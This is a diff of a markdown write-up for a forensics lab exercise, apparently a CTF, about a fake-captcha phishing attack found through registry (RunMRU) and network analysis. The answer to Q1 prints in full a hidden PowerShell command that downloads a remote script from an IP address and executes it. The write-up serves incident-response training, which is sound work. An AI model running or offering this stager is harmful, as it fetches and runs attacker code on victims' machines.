@@ -3,10 +3,11 @@
 
 Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.
 
+___
 
-Q1: It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
+### Q1: It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
 
-A: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
+#### A: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
 
 We go to the hive of the indicated user.
 
@@ -16,6 +17,8 @@ Load it and go to bookmark.
 Under RunMRU we find it.
 
 ![](../../Img/Pasted%20image%2020250513153145.png)
+
+___
 
 Q2: At what time in UTC did the malicious payload execute?
 
@@ -78,3 +81,5 @@ It seems to be the web page.
 Reading through it i found it. (If the pcapng was massive, the http filter would have helped)
 
 ![](../../Img/Pasted%20image%2020250513160553.png)
+
+Tags: [NTUSER Analysis](../../Index/NTUSER%20Analysis.md) [[RE]]
